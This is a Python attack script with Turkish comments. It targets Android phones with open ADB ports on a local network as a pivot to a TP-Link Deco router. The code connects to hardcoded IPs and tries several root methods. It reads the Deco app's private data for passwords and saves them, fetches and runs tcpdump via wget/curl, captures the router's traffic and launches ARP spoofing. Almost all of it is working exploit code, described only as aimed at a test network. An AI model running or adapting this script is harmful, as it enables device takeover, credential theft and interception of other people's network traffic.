#!/usr/bin/env python3
"""
Android ADB Exploit ve Pivot Aracı
Test ağındaki Android cihazlar üzerinden Deco'ya saldırı
"""

import socket
import subprocess
import os
import time

TARGET_ANDROIDS = [
    "192.168.68.105",
    "192.168.68.139",
]

DECO_IP = "192.168.68.1"
DECO_MAC = "9C:A2:F4:2D:5F:A0"

print("="*70)
print("[*] ANDROID ADB PIVOT ARACI")
print("="*70)

def check_adb_port(ip, port=5555):
    """ADB portunun açık olup olmadığını kontrol et"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

def adb_connect(ip, port=5555):
    """ADB ile bağlan"""
    try:
        result = subprocess.run(['adb', 'connect', f'{ip}:{port}'], 
                              capture_output=True, text=True, timeout=5)
        if 'connected' in result.stdout.lower():
            return True
        return False
    except:
        return False

def adb_shell(ip, command):
    """ADB shell komutu çalıştır"""
    try:
        # Önce o cihaza bağlan
        subprocess.run(['adb', 'connect', ip], capture_output=True, timeout=3)
        
        # Komutu çalıştır
        result = subprocess.run(['adb', '-s', f'{ip}:5555', 'shell', command],
                              capture_output=True, text=True, timeout=10)
        return result.stdout
    except:
        return None

def install_tcpdump(ip):
    """Android cihaza tcpdump yükle"""
    print(f"[*] {ip} - tcpdump yükleniyor...")
    
    # tcpdump binary'sini indir (ARM için)
    tcpdump_url = "https://github.com/extremecoders-re/tcpdump-android-builds/raw/master/tcpdump"
    
    commands = [
        "cd /data/local/tmp",
        "wget -O tcpdump http://192.168.68.100:8000/tcpdump || curl -o tcpdump http://192.168.68.100:8000/tcpdump",
        "chmod 755 tcpdump",
        "./tcpdump --version"
    ]
    
    for cmd in commands:
        output = adb_shell(ip, cmd)
        if output:
            print(f"    {output.strip()[:100]}")

def capture_deco_traffic(ip):
    """Deco'nun ağ trafiğini yakala"""
    print(f"[*] {ip} - Deco trafiği yakalanıyor...")
    
    # Sadece Deco'nun IP/MAC adresine ait paketleri yakala
    capture_cmd = f"su -c 'tcpdump -i wlan0 -w /sdcard/deco_capture.pcap host {DECO_IP} &'"
    
    output = adb_shell(ip, capture_cmd)
    print(f"[*] Yakalama başlatıldı: {output}")
    
    # 30 saniye bekle
    time.sleep(30)
    
    # PCAP dosyasını çek
    subprocess.run(['adb', '-s', f'{ip}:5555', 'pull', '/sdcard/deco_capture.pcap', f'deco_{ip}.pcap'])
    print(f"[+] PCAP dosyası kaydedildi: deco_{ip}.pcap")

def analyze_deco_app(ip):
    """Deco uygulamasının verilerini analiz et"""
    print(f"[*] {ip} - Deco uygulaması analiz ediliyor...")
    
    # TP-Link Deco uygulamasının veritabanını bul
    commands = [
        "find /data/data -name '*.db' 2>/dev/null | grep -i deco",
        "find /data/data -name '*.xml' 2>/dev/null | grep -i deco",
        "ls -la /data/data/com.tplink.deco/",
        "cat /data/data/com.tplink.deco/shared_prefs/*.xml 2>/dev/null"
    ]
    
    for cmd in commands:
        output = adb_shell(ip, cmd)
        if output and len(output) > 10:
            print(f"\n[!] Potansiyel hassas veri:")
            print(output[:500])
            
            # Owner ID veya şifre ara
            if 'owner' in output.lower() or 'password' in output.lower():
                print("[!] ŞİFRE BULUNDU!")
                # Şifreyi kaydet
                with open(f'deco_creds_{ip}.txt', 'w') as f:
                    f.write(output)

def enable_root_adb(ip):
    """ADB root erişimi sağlamaya çalış"""
    print(f"[*] {ip} - Root erişimi deneniyor...")
    
    result = adb_shell(ip, 'su -c "id"')
    if 'uid=0' in result:
        print(f"[+] {ip} ZATEN ROOT!")
        return True
    
    # Root exploit'leri dene
    exploits = [
        'adb root',
        'su',
        'busybox su',
        '/system/xbin/su',
        '/system/bin/su'
    ]
    
    for exp in exploits:
        result = adb_shell(ip, exp)
        if result and '#' in result:
            print(f"[+] Root erişimi sağlandı: {exp}")
            return True
    
    return False

# Ana döngü
for android_ip in TARGET_ANDROIDS:
    print(f"\n[*] Hedef: {android_ip}")
    print("-"*50)
    
    # ADB port kontrolü
    if not check_adb_port(android_ip):
        print(f"[-] ADB portu (5555) kapalı")
        
        # Alternatif portları dene
        for alt_port in [5554, 5037, 27183]:
            if check_adb_port(android_ip, alt_port):
                print(f"[+] ADB portu {alt_port} açık!")
                adb_port = alt_port
                break
        else:
            print(f"[-] ADB portu bulunamadı")
            continue
    else:
        adb_port = 5555
        print(f"[+] ADB portu {adb_port} açık")
    
    # Bağlan
    if adb_connect(android_ip, adb_port):
        print(f"[+] ADB bağlantısı başarılı!")
        
        # Root kontrolü
        is_root = enable_root_adb(android_ip)
        
        if is_root:
            print(f"[!] ROOT ERİŞİMİ VAR!")
            
            # Deco uygulamasını analiz et
            analyze_deco_app(android_ip)
            
            # Trafik yakala
            capture_deco_traffic(android_ip)
            
            # ARP spoofing ile MITM (root varsa)
            print(f"[*] ARP spoofing deneniyor...")
            mitm_cmd = f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward && arpspoof -i wlan0 -t {DECO_IP} 192.168.68.1 &'"
            adb_shell(android_ip, mitm_cmd)
            
        else:
            print(f"[!] Root yok, sınırlı erişim")
            
            # Yine de uygulama verilerini okumaya çalış
            analyze_deco_app(android_ip)
            
    else:
        print(f"[-] ADB bağlantısı başarısız")

print("\n" + "="*70)
print("[*] İşlem tamamlandı!")
print("[*] Bulunan bilgiler:")
print("    - deco_*.pcap : Ağ trafiği")
print("    - deco_creds_*.txt : Kimlik bilgileri")